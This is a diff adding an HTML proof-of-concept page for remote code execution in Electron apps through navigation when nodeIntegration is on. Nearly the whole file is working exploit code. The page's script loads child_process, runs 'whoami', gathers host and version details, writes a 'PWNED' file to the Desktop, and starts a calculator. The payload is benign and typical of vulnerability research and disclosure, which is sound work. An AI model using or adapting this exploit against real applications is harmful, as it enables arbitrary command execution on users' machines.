@@ -1,0 +1,28 @@
+<!doctype html>
+<html>
+<head><meta charset="utf-8"><title>Electron RCE PoC</title></head>
+<body>
+<h1>nodeIntegration-RCE via Navigation</h1>
+<pre id="out">running…</pre>
+<script>
+(function () {
+  var out = document.getElementById('out');
+  try {
+    var cp = require('child_process'), os = require('os'), fs = require('fs');
+    var info = [
+      'execPath=' + process.execPath,
+      'electron=' + process.versions.electron + ' chrome=' + process.versions.chrome,
+      'whoami='   + cp.execSync('whoami').toString().trim(),
+      'hostname=' + os.hostname(),
+      'origin='   + location.origin
+    ].join('\n');
+    out.textContent = 'NODE ACCESS CONFIRMED\n' + info;
+    try { fs.writeFileSync((process.env.USERPROFILE||process.env.HOME)+'/Desktop/PWNED_VIA_NAVIGATION.txt', info); } catch(_) {}
+    cp.exec(process.platform === 'win32' ? 'calc.exe' : 'xcalc');
+  } catch (e) {
+    out.textContent = 'kein Node-Zugriff: ' + e;
+  }
+})();
+</script>
+</body>
+</html>
